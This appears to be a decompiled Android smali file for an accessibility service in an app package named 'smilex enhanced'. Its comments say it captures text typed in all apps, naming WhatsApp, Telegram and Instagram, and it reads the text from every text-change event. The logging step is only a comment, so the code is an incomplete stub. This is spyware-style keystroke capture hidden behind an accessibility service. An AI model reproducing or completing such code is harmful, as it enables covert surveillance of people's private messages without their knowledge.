.class public Lcom/smilex/enhanced/services/AccessibilityMonitorService;
.super Landroid/accessibilityservice/AccessibilityService;
.source "AccessibilityMonitorService.java"

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V
    return-void
.end method

.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .registers 5
    # Capture text from all apps: WhatsApp, Telegram, Instagram, etc.
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I
    move-result v0
    # TYPE_VIEW_TEXT_CHANGED = 16
    const/16 v1, 0x10
    if-ne v0, v1, :skip
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;
    move-result-object v2
    # Log captured text
    :skip
    return-void
.end method

.method public onInterrupt()V
    .registers 1
    return-void
.end method
